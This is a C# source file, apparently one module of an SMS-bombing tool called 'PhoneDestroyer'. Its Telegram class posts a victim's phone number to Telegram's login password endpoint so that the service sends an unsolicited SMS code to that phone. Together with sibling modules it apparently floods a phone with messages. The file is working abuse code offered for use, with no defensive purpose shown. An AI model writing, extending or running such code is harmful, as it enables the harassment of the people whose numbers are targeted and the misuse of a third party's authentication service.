using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services
{
    public class Telegram : Service
    {
        public override string Name => "Telegram";
        public override CountryCodes AvailableFor => CountryCodes.Any;

        public override async Task<bool> SendSmsAsync()
        {
            var phone = $"+{(int)CountryCode}{PhoneNumber}";
            var resp = await Client.PostAsync(
                "https://my.telegram.org/auth/send_password",
               new FormUrlEncodedContent(new List<KeyValuePair<string, string>>()
               {
                    KeyValuePair.Create("phone", phone),
               }));
            if (LogDebug)
            {
                var content = await resp.Content.ReadAsStringAsync();
                Logger.LogDebug(content);
            }

            return resp.IsSuccessStatusCode;
        }
    }
}
